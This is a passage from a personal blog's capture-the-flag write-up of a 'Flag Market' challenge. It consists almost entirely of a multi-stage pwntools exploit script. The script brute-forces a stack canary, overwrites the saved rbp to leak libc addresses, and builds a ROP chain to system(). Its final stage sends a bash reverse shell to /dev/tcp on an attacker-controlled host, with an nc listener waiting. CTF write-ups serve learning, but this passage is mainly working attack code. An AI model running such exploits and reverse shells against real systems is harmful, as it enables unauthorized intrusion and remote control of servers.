+</span></span><span style=display:flex><span>		r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>		io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#39;BUY_FLAG /buy_flag HTTP/1.1&#39;</span>)
+</span></span><span style=display:flex><span>		time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)
+</span></span><span style=display:flex><span>		io<span style=color:#f92672>.</span>sendline(req_)
+</span></span><span style=display:flex><span>		data <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Error&#39;</span> <span style=color:#f92672>in</span> data:
+</span></span><span style=display:flex><span>			io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>			r<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>continue</span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>			io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>			r<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>			canary <span style=color:#f92672>=</span> tmp
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;CANARY: &#34;</span> <span style=color:#f92672>+</span> hex(int<span style=color:#f92672>.</span>from_bytes(canary,byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>STAGE THREE:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Leak libc address by overwriting the saved rbp
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Makes the rbp such that it will use the address we have in fake_stack_layout for the connect_backend and snprintf
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Especially the credit address is at [rbp - 0x18], thus we have arbitrary read
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Read libc address on the stack
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Similarly to leak stack address our connection r will have port and host overflown to our remote server
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>rbp <span style=color:#f92672>=</span> stack_leak <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xa58</span>
+</span></span><span style=display:flex><span>port_addr <span style=color:#f92672>=</span> stack_leak <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3f0</span>
+</span></span><span style=display:flex><span>host_addr <span style=color:#f92672>=</span> port_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x180</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>fake_stack_layout <span style=color:#f92672>=</span> p64(port_addr) <span style=color:#f92672>+</span> p64(host_addr) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>5</span> <span style=color:#f92672>+</span> p64(stack_leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x808</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>req2 <span style=color:#f92672>=</span> req1<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>800</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>) <span style=color:#f92672>+</span> fake_stack_layout <span style=color:#75715e># Connection r will have the fake_stack_layout appended at the end of request</span>
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>=</span> overflow
+</span></span><span style=display:flex><span>to <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x28</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span>) <span style=color:#f92672>+</span> canary <span style=color:#f92672>+</span> p64(rbp)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> p16(len(to), endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> to
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;/bin/nc -lnvp 51235&#34;</span>,shell <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(req2)
+</span></span><span style=display:flex><span>time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(req_)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;card_holder=&#34;</span>)
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LAST STAGE:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ROP and reverse shell with bash
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>libc_leak <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span>  <span style=color:#ae81ff>0x92059</span>
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;LIBC LEAK ADDRESS: &#34;</span> <span style=color:#f92672>+</span> hex(libc_leak))
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;LIBC BASE ADDRESS: &#34;</span> <span style=color:#f92672>+</span> hex(libc_base))
+</span></span><span style=display:flex><span>system <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x52290</span>
+</span></span><span style=display:flex><span>pop_rdi_rbp <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x00000000000248f2</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>=</span> overflow
+</span></span><span style=display:flex><span>to <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x28</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span>) <span style=color:#f92672>+</span> canary <span style=color:#f92672>+</span> p64(rbp)
+</span></span><span style=display:flex><span>to <span style=color:#f92672>+=</span> p64(pop_rdi_rbp) <span style=color:#f92672>+</span> p64(stack_leak <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x70c</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>to <span style=color:#f92672>+=</span> p64(system)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> p16(len(to), endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> to
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req_ <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;/bin/nc -lnvp 51235&#34;</span>,shell <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;BUY_FLAG /buy_flag HTTP/1.1 bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span style=color:#e6db74>{</span>r_ip<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{</span>r_port<span style=color:#e6db74>}</span><span style=color:#e6db74> 0&gt;&amp;1&#39;&#34;</span>)
+</span></span><span style=display:flex><span>time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(req_)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><img class=about__logo src=https://piers-n.github.io/images/cat.png alt=Logo><h1 class=about__title>piers</h1><p class=about__description>My personal blog on the journey of learning how2pwn</p></div><ul class=aside__social-links><li><a href=https://github.com/piers-n rel=me aria-label=GitHub title=GitHub><i class="fab fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=sendhelp2703@gmail.com rel=me aria-label=Email title=Email><i class="fas fa-envelope" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>Writeup on Flag Market Challenge</p><p>By Piers,
+06-09-2022</p></div></section><footer class=page__footer><p class=copyright>© 2022</p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p></footer></div></body></html>
